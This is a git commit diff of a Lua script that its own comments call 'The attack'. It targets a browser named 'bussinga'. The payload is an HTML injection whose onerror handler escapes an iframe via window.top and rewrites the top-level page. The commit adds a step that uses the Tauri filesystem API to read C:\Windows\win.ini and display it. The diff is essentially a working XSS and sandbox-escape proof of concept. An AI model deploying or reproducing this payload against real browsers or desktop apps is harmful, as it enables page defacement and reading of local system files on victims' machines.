7f51179656fe0d1508fd7aa8f71cc7559e071e06
inventionpro <109528211+inventionpro@users.noreply.github.com>
2026-04-28 21:27:01 +0200

    Test file read

--- script.lua
+++ script.lua
@@ -2,7 +2,7 @@ if window ~= nil then
   if window.browser == 'bussinga' then
     -- The attack
     -- Since the image has an invalid source, onerror will run
-    -- window.top escpaces the iframe and then sets the body to a good messgae :3
-    get('l').set_content('<img src="x" onerror="window.top.document.querySelector(`html`).innerHTML=`<p>men kissing</p>`">')
+    -- window.top escapes the iframe and then sets the body to a good messgae :3
+    get('l').set_content('<img src="x" onerror="window.top.document.querySelector(`html`).innerHTML=`<p>men kissing</p>`;__TAURI__.fs.readFile(`C:\Windows\win.ini`).then(res=>window.top.document.querySelector(`html`).innerText=res)">')
   end
 end
